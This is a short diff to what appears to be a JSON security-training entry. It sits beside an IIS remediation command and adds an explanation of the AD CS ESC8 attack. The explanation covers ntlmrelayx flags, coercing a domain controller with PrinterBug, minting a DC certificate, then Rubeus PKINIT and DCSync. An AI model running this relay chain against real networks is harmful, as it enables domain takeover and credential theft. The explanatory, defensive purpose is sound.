@@ -117,5 +117,6 @@
       "label": "Disable ADCS web enrollment HTTP on IIS",
       "command": "Import-Module WebAdministration; Set-WebBinding -Name 'Default Web Site' -Protocol 'http' -Action 'Delete'"
     }
-  ]
+  ],
+  "explain": "Relays a coerced DC's NTLM auth to the ADCS web enrollment endpoint (ESC8) to mint a DC certificate:\n  impacket-ntlmrelayx       relay captured NTLM authentication\n  -t http://<pki_ip>/certsrv/default.asp   the HTTP web-enrollment target (no HTTPS = relayable)\n  --template DomainController   request a cert using the DC certificate template\n  -smb2support --adcs      support SMB2 and enable the AD CS attack mode\nCoerce the DC (PrinterBug) so its auth arrives; the relayed cert lets Rubeus PKINIT as DC$ and then DCSync. Fix by disabling HTTP web enrollment on IIS."
 }
